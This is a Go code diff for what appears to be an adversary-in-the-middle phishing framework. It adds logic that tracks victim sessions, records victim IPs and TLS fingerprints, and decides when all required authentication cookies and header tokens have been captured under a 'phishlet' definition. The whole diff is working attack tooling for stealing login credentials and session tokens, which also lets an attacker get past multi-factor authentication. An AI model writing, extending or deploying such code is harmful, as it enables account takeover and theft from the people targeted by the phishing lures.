@@ -1,7 +1,11 @@
 package aitm
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
+	"fmt"
+	"strings"
 	"time"
 )
 
@@ -55,6 +59,45 @@ func (s *Session) IsDone() bool { return s.CompletedAt != nil }
 
 // HasCredentials returns true if at least a username has been captured.
 func (s *Session) HasCredentials() bool { return s.Username != "" }
+
+// HasRequiredTokens returns true when all non-always auth tokens defined by
+// def have been captured in this session. Used by TokenExtractor to determine
+// when to fire EventSessionCompleted.
+func (s *Session) HasRequiredTokens(def *PhishletDef) bool {
+	if def == nil {
+		return false
+	}
+	for _, rule := range def.AuthTokens {
+		if rule.Always {
+			continue
+		}
+		switch rule.Type {
+		case TokenTypeCookie:
+			if !s.hasCookieToken(rule) {
+				return false
+			}
+		case TokenTypeHTTPHeader:
+			if rule.Name != nil && s.HttpTokens[rule.Name.String()] == "" {
+				return false
+			}
+		}
+	}
+	return true
+}
+
+func (s *Session) hasCookieToken(rule TokenRule) bool {
+	for domain, byName := range s.CookieTokens {
+		if rule.Domain != "" && !strings.HasSuffix(strings.ToLower(domain), strings.ToLower(rule.Domain)) {
+			continue
+		}
+		for name := range byName {
+			if rule.Name != nil && rule.Name.MatchString(name) {
+				return true
+			}
+		}
+	}
+	return false
+}
 
 // Complete marks the session as done with the current timestamp.
 func (s *Session) Complete() {
@@ -159,6 +202,52 @@ func (s *SessionService) List(f SessionFilter) ([]*Session, error) {
 
 func (s *SessionService) Delete(id string) error {
 	return s.store.DeleteSession(id)
+}
+
+// NewSessionFromContext creates and persists a new session seeded from the
+// proxy context. Satisfies the request.SessionFactory interface.
+func (s *SessionService) NewSessionFromContext(ctx *ProxyContext) (*Session, error) {
+	id, err := newSessionID()
+	if err != nil {
+		return nil, fmt.Errorf("generating session ID: %w", err)
+	}
+	sess := &Session{
+		ID:         id,
+		RemoteAddr: ctx.ClientIP,
+		JA4Hash:    ctx.JA4Hash,
+		StartedAt:  time.Now(),
+	}
+	if ctx.Lure != nil {
+		sess.LureID = ctx.Lure.ID
+		sess.RedirectURL = ctx.Lure.RedirectURL
+	}
+	if ctx.Phishlet != nil {
+		sess.Phishlet = ctx.Phishlet.Name
+	}
+	if err := s.store.CreateSession(sess); err != nil {
+		return nil, fmt.Errorf("creating session: %w", err)
+	}
+	s.bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
+	return sess, nil
+}
+
+// NewSession satisfies the request.SessionFactory interface (calls NewSessionFromContext).
+func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
+	return s.NewSessionFromContext(ctx)
+}
+
+// IsComplete reports whether all required auth tokens have been captured.
+// Satisfies the response.SessionCompleter interface.
+func (s *SessionService) IsComplete(sess *Session, def *PhishletDef) bool {
+	return sess.HasRequiredTokens(def)
+}
+
+func newSessionID() (string, error) {
+	buf := make([]byte, 16)
+	if _, err := rand.Read(buf); err != nil {
+		return "", err
+	}
+	return hex.EncodeToString(buf), nil
 }
 
 // ExportCookiesJSON returns the captured cookies for a session as a JSON byte
